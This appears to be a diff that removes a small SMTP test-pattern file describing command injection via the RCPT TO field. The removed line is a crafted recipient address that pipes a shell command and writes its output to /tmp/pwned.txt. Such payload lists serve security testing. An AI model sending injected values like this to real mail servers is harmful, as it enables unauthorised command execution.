@@ -1,4 +1,0 @@
-# Description: Command injection if the recipient address is processed by a script.
-# Target Messages: RCPT TO
-# Pattern:
-RCPT TO:<"|/usr/bin/id >/tmp/pwned.txt">
